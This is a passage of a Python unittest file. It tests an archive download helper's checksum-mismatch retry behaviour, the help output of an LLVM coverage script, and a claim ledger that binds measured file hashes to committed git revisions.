                patch.object(setup_benchmark_oracle.time, "sleep") as sleep,
            ):
                with self.assertRaisesRegex(SystemExit, "checksum mismatch"):
                    setup_benchmark_oracle.ensure_archive(archive)

            self.assertFalse(archive.exists())
            self.assertEqual(list(Path(directory).iterdir()), [])
            self.assertEqual(urlopen.call_count, setup_benchmark_oracle.DOWNLOAD_ATTEMPTS)
            self.assertEqual(
                [call.args[0] for call in sleep.call_args_list], [1, 2]
            )


class CoverageCliTests(unittest.TestCase):
    def test_help_formats_percentages_on_supported_python_versions(self) -> None:
        script = Path(__file__).with_name("verify_llvm_coverage.py")
        result = subprocess.run([sys.executable, str(script), "--help"],
                                capture_output=True, text=True, check=False)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("--strict", result.stdout)


class ClaimLedgerTests(unittest.TestCase):
    def test_measured_hashes_bind_to_committed_inputs_not_current_files(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            def git(*args: str) -> bytes:
                return subprocess.check_output(["git", *args], cwd=root, stderr=subprocess.DEVNULL)
            git("init", "-q")
            measured = {}
            for field in ("manifest_sha256", "matrix_sha256"):
                path = root / claim_ledger.HASHED_FILES[field]
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(b"measured inputs\n")
                measured[field] = hashlib.sha256(path.read_bytes()).hexdigest()
            git("add", ".")
            git("-c", "user.name=Ledger test", "-c", "user.email=ledger@example.invalid",
                "-c", "commit.gpgsign=false", "commit", "-qm", "measured inputs")
            ledger = {"base_revision": git("rev-parse", "HEAD").decode().strip(),
                      "measured_inputs": measured}
            for field in measured:
                (root / claim_ledger.HASHED_FILES[field]).write_bytes(b"new unmeasured inputs\n")
            with patch.object(claim_ledger, "ROOT", root):
                errors = []
                claim_ledger.verify_measured_inputs(ledger, errors)
                self.assertEqual(errors, [])
                for field in measured:
                    changed = copy.deepcopy(ledger)
                    changed["measured_inputs"][field] = claim_ledger.sha256(root / claim_ledger.HASHED_FILES[field])
                    errors = []
                    claim_ledger.verify_measured_inputs(changed, errors)
                    self.assertEqual(errors, [f"measured_inputs.{field} does not match measured revision"])
                for invalid in [{}, {"base_revision": "not-a-commit"},
                                {"base_revision": ledger["base_revision"]},
                                {**ledger, "base_revision": "0" * 40}]:
                    errors = []
                    claim_ledger.verify_measured_inputs(invalid, errors)
                    self.assertTrue(errors)


if __name__ == "__main__":
    unittest.main()
